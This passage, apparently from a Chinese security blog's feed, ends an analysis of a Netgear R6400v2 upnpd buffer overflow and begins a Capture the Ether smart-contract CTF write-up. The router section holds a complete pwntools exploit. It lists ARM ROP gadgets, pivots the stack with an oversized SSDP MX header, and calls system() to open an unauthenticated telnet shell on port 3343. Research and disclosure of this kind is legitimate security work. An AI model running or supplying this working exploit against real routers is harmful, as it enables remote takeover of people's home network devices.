&#123;r4, pc&#125;;</span></span><br><span class="line">0x0000bac8: str r3, [r4]; add r0, r0, <span class="comment">#0x18400; add r0, r0, #0x2a0; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x000272ec: str r3, [r4]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0002dd64: str r3, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0000bc1c: str r3, [sp, <span class="comment">#4]; bl #0x3278; add sp, sp, #8; pop &#123;lr&#125;; add sp, sp, #0xc; bx lr;</span></span><br><span class="line">0x00014188: str r4, [sp, <span class="comment">#0xfc]; str ip, [sp, #0xf8]; bl #0x33b0; mov r0, r4; add sp, sp, #0x104; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017e98: str r5, [sp, <span class="comment">#4]; bl #0x308c; mov r0, r4; bl #0x2e64; add sp, sp, #0xd4; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br></pre></td></tr></table></figure><p>对于这样的需求，我从这些 gadget 中选取了 <code>0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</code> 这条指令， 通过控制 r5、 r6 寄存器，我们可以将任意值从r6 写到 r5 所指向到地址中。然后我通过 for 循环就可以构造出将任意字符串，写到任意地址中的 rop 链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br></pre></td></tr></table></figure><p>最后呢，在找一条 <code>mov r0, r?, bl system </code>  这样的gadget， 将为可控的 <code>R3</code> 到 <code>R7</code> 寄存器中的一个覆写成刚刚写入了命令的地址，然后将值 mov 到 <code>r0</code> 寄存器上。 因为 arm 到参数传递是由寄存器传递的，通过控制 <code>r0</code> 寄存器， 我们就可以控制 <code>system</code> 执行任意命令。</p><p>这里了使用的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0002704C                 MOV             R0, R4  ; command</span><br><span class="line">.text:00027050                 BL              system</span><br></pre></td></tr></table></figure><p>找齐所有的gadget ，并且将 rop 链布置到 <code>SP+0x800</code>的位置， 因此第一次链接到代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"> </span><br><span class="line">s = remote(<span class="string">&#x27;10.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>然后第二次链接，为只需劫持返回地址到 stack pivot  的地址上即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.text:00011B90                 ADD             SP, SP, #0x800</span></span><br><span class="line"><span class="comment">#.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>]) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><p>所以最后的 exploit为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>).decode(<span class="string">&#x27;latin&#x27;</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>].decode(<span class="string">&#x27;latin&#x27;</span>)) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x8F874</span></span><br><span class="line">str_r6_r5 = <span class="number">0x0002dd4c</span></span><br><span class="line"><span class="comment"># 0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/usr/sbin/telnetd -p 3343 -b 0.0.0.0 -l /bin/sh \x00&quot;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (<span class="built_in">len</span>(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;exploit .....&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>【1】 <a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 官方公告</a><br>【2】 <a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 固件</a><br>【3】 <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a><br>【4】 <a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-45527" scheme="https://bestwing.me/tags/CVE-2021-45527/"/>
    
    <category term="netgear" scheme="https://bestwing.me/tags/netgear/"/>
    
  </entry>
  
  <entry>
    <title>Capture The Ether Writeup</title>
    <link href="https://bestwing.me/Capture-The-Ether-writeup.html"/>
    <id>https://bestwing.me/Capture-The-Ether-writeup.html</id>
    <published>2022-05-06T16:00:00.000Z</published>
    <updated>2022-05-07T11:18:45.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Capture the ether 是一个适合用来入门合约的 wargame 平台。我最近一直到五一花了点时间做了下一下。 另外这里感谢 @0x9k @pikachu @xhyumiracle @iczc 给我提供的帮助。</p><h2 id="平台地址"><a href="#平台地址" class="headerlink" title="平台地址"></a>平台地址</h2><p><a href="https://capturetheether.com/challenges/">Capture the Ether - Challenges</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="1-Deploy-a-contract"><a href="#1-Deploy-a-contract" class="headerlink" title="1. Deploy a contract"></a>1. Deploy a contract</h3><p><strong>题目描述：</strong></p><p>To complete this challenge, you need to:</p><ol><li> Install <a href="https://metamask.io/">MetaMask</a>.</li><li> Switch to the <strong>Ropsten test network</strong>.</li><li> Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a <em>faucet</em> that gives out free test ether.</li></ol><p>After you’ve done that, press the red button on the left to deploy the challenge contract.</p><p>You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DeployChallenge &#123;</span><br><span class="line">    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.</span><br><span class="line">    function isComplete() public pure returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解题</strong></p><p>安装完 <code>MetaMask</code> 后， 开启测试网络。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png"></a></p><p>获取代币： 通常 <code>MetaMask</code> 切换到 Ropsten 测试网络后， 点击购买， 可以看到一个 <code>测试水管</code> ，可以从一个水龙头获取代币</p><p>水龙头： <a href="https://faucet.metamask.io/">https://faucet.metamask.io/</a> </p><p>但是这个水龙头我获取不到代币，最后用了 @iczc 的水龙头获取的： <a href="https://faucet.chainflag.org/">ETH Testnet Faucet (chainflag.org)</a></p><h3 id="2-callme"><a href="#2-callme" class="headerlink" title="2. callme"></a>2. callme</h3><p><strong>题目描述</strong></p><p>To complete this challenge, all you need to do is call a function.</p><p>The “Begin Challenge” button will deploy the following contract:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Call the function named <code>callme</code> and then click the “Check Solution” button.</p><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=7ou6MoKmxFQ">Call On Me</a>.</p><p><strong>解题</strong></p><p>题目要让我们部署合约后，调用 <code>callme</code> 这个函数，意思让我们尝试与部署后的合约进行交互。</p><ol><li>部署题目合约， 得到一个 challenge 地址</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png"></a><br>2. 安装 remix-ide 编辑器，或者使用在线的： <a href="https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">Remix - Ethereum IDE</a></p><p>部署题目合约用来交互调用 challenge 的 callme 函数</p><p>部署方法如下</p><ul><li><p>在文件编辑器中， contracts 文件中新建 <code>callme.sol</code>， 内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>转到编译界面，设置编译器版本，然后选择下方的编译</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png"></a></p><ul><li>转到部署界面</li></ul><p>选择 <code>injected web3</code> , 点击部署， 填入 <code>At address</code> , 然后就能调用对应公开方法</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png"></a></p><p>这里有一个需要注意的地方，调用 callme 的时候记得看清楚调用的合约地址， 像图中这个地方其实调用的方法不对。应该在下面还有一个callme</p><h3 id="3-Choose-a-nickname"><a href="#3-Choose-a-nickname" class="headerlink" title="3. Choose a nickname"></a>3. Choose a nickname</h3><p><strong>题目描述</strong></p><p>WARMUP: 200 POINTS</p><p><a href="https://capturetheether.com/challenges/warmup/nickname/#">Begin Challenge</a></p><p>It’s time to set your Capture the Ether nickname! This nickname is how you’ll show up on the <a href="https://capturetheether.com/leaderboard/">leaderboard</a>.</p><p>The <code>CaptureTheEther</code> smart contract keeps track of a nickname for every player. To complete this challenge, set your nickname to a non-empty string. The smart contract is running on the Ropsten test network at the address <code>0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee</code>.</p><p>Here’s the code for this challenge:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Relevant part of the CaptureTheEther contract.</span><br><span class="line">contract CaptureTheEther &#123;</span><br><span class="line">    mapping (address &#x3D;&gt; bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    function setNickname(bytes32 nickname) public &#123;</span><br><span class="line">        nicknameOf[msg.sender] &#x3D; nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Challenge contract. You don&#39;t need to do anything with this; it just verifies</span><br><span class="line">&#x2F;&#x2F; that you set a nickname for yourself.</span><br><span class="line">contract NicknameChallenge &#123;</span><br><span class="line">    CaptureTheEther cte &#x3D; CaptureTheEther(msg.sender);</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Your address gets passed in as a constructor parameter.</span><br><span class="line">    function NicknameChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check that the first character is not null.</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return cte.nicknameOf(player)[0] !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9YZXPs8uAB0">Say My Name</a>.</p><p><strong>解题</strong></p><p>题目要求我们设置我们的 <code>nickname</code>, 调用 <code>setNickName</code> 方法即可， 但是这里函数传入的类型为 <code>bytes32</code> , 所以我们需要将我们的我们的 nickname 转为 <code>bytes32</code> ， 我这里使用在线的网站进行转换</p><p><a href="https://www.testcoins.io/str-bytes32">String To Bytes32 Online Converter (testcoins.io)</a></p><p>转完之后， 在 remix-ide 中调用 <code>setNickName</code> 方法</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png"></a></p><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="1-Guesst-the-number"><a href="#1-Guesst-the-number" class="headerlink" title="1. Guesst the number"></a>1. Guesst the number</h3><p><strong>题目描述</strong></p><p>I’m thinking of a number. All you have to do is guess it.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer &#x3D; 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        